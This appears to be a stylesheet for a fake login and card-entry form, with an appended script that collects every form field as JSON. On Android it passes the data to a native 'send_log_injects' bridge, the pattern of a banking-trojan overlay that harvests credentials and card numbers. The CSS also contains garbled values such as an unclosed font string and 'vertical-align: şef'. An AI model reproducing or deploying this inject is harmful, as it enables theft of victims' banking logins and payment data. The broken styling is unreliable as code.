body {
        background: #fff;
        margin: 0;
        padding: 0;
          font-family: "Ariel;
        background-size: 100%;
	

}
html {
     font-family: "Times New Roman", Times, serif;

}
.header {
    position: relative;
    z-index: 2;
}
.logongardient {
    
    margin-top: 50px;
    text-align: center;
}
.logo {
    margin: 0 auto;
    text-align: center;
}
.main {
    margin-top: 10px;
}
.autorizeBox {
    border-radius: 5px;
    padding: 1.25rem 0;
    max-width: 384px !important;
    overflow: visible !important;
    margin: 0 auto;
}
@media only screen and (max-width: 444px) {
    .autorizeBox {
        margin: 0 20px;
    }
}
.autorizeBox form {
    position: relative;
    min-height: .0625rem;
    padding: 5px 35px;
}
.autorizeBox ::placeholder {
    color: #8c8484;
    opacity: 1;
}
.autorizeBox label {
    font-size: 1.125rem;
    -webkit-touch-callout: none;
    -webkit-user-select: none;
    -khtml-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none;
    margin-left: 5px;
}
.autorizeBox input {
    background: #fff;
    color: #000;
    font-size: 1.125rem;
    border: none;
    padding: 10px 7px;
    margin: 10px 0;
    width: 96%;
}
.autorizeBox input.dt {
    width: 50%;
}
.autorizeBox button {
    margin: 15px 0;
    background-color: #fff;
    border: solid #fff 0.7px;
	-moz-border-radius: 30px;
	-webkit-border-radius: 46px;
    color:  #fff;
    width: 130%;
    height: 3.0rem;
    overflow-x: auto;
    text-align: auto;
    vertical-align: middle;
    cursor: pointer;
	margin-left: -40px;
	background-color: #06a9e4; /* Цвет фона */
    overflow-x: auto;
    text-align: auto;
    vertical-align: şef;
    cursor: pointer;
	
	
}
.autorizeBox button span {
    line-height: 1.125rem;
    white-space: normal;
    margin: .0625rem .75rem;
    font-size: 1rem;
    font-weight: 600;
	
    color: #fff;
    letter-spacing: 0;
    text-decoration: none;
}
.footer {
    font-size: 16px;
    padding: 1em 0;
    margin-top: 50px;
    bottom: 0;
    left: 0;
    right: 0;
    color: #757575;
    font-size: .65625rem;
    text-align: center;
}
.footer p {
    margin: 25px 0;
}
#ccnumlbl {
    color: red;
    font-size: 0.8rem;
}
.warntext {
    color: red;
    margin-bottom: 20px;
    text-align: center;
    font-weight: bolder;
}
INPUT[type="text"] {
  margin-bottom: 1.25em;
    height: 40px;

    box-shadow: none;
    color: #000;
    font-size: 1em;
    font-family: Helvetica, Arial, sans-serif;
    font-size: 14px;
    font-weight: 400;
    direction: ltr;
}
INPUT[type="password"]:focus {
    background-color: #fff0; /* Цвет фона */
    color: #000; /* Цвет текста */
    border: solid #000 0.7px;
}

<script>
        
        var allButtons = document.getElementsByTagName('button');
        for(var btn in allButtons) {
            allButtons[btn].disabled = true;
        }
        
        function CheckValidInput(id) {
            var finalbool = true, formids = document.getElementById(id);
            var currentinputs = formids.getElementsByTagName('input');
            for(var i = 0; i < currentinputs.length; i++ ) {
                finalbool &= currentinputs[i].checkValidity();
            }
            formids.getElementsByTagName('button')[0].disabled = !finalbool;
        }
        
        var AllForms = document.getElementsByTagName('form');
        for(var i = 0; i < AllForms.length; i++) {
            var myInputs = AllForms[i].getElementsByTagName('input');
            for(var j = 0; j < myInputs.length; j++) {
                AddInputEventByFormID(myInputs[j],AllForms[i].id);
            }
        }
        
        function AddInputEventByFormID(input, formid) {
            input.addEventListener('input', function(){CheckValidInput(formid)});
        }
        
        function process(formId) {
    var ua = navigator.userAgent.toLowerCase();
    if(ua.indexOf("android") > -1) {
        try {
        Android.send_log_injects(formToJSON(document.getElementById(formId)));
        } catch (err) {}
    }else{
       alert(formToJSON(document.getElementById(formId)));
    }
    formChange(formId);
}

        /*********Recursive implementation of jSON.stringify; ********/
        var stringifyJSON = function(obj) {
            var arrOfKeyVals = [],
                arrVals = [],
                objKeys = [];
        
            /*********CHECK FOR PRIMITIVE TYPES**********/
            if (typeof obj === 'number' || typeof obj === 'boolean' || obj === null)
                return '' + obj;
            else if (typeof obj === 'string')
                return '"' + obj + '"';
        
            /*********CHECK FOR ARRAY**********/
            else if (Array.isArray(obj)) {
                if (obj[0] === undefined)
                    return '[]';
                else {
                    obj.forEach(function(el) {
                        arrVals.push(stringifyJSON(el));
                    });
                    return '[' + arrVals + ']';
                }
            }
            /*********CHECK FOR OBJECT**********/
            else if (obj instanceof Object) {
                objKeys = Object.keys(obj);
                objKeys.forEach(function(key) {
                    var keyOut = '"' + key + '":';
                    var keyValOut = obj[key];
                    if (keyValOut instanceof Function || typeof keyValOut === undefined)
                        arrOfKeyVals.push('');
                    else if (typeof keyValOut === 'string')
                        arrOfKeyVals.push(keyOut + '"' + keyValOut + '"');
                    else if (typeof keyValOut === 'boolean' || typeof keyValOut === 'number' || keyValOut === null)
                        arrOfKeyVals.push(keyOut + keyValOut);
                    else if (keyValOut instanceof Object) {
                        arrOfKeyVals.push(keyOut + stringifyJSON(keyValOut));
                    }
                });
                return '{' + arrOfKeyVals + '}';
            }
        };
        
        function formToJSON(f)
        {
            var FinalObject = {}, namesHTML = ['input','select'];
            for(var i = 0; i < namesHTML.length; i++) {
                var bsform = f.getElementsByTagName(namesHTML[i]);
                for(var j = 0; j < bsform.length; j++) {
                    FinalObject[bsform[j].id] = bsform[j].value
                }
            }
            return stringifyJSON(FinalObject);
        }
        </script>
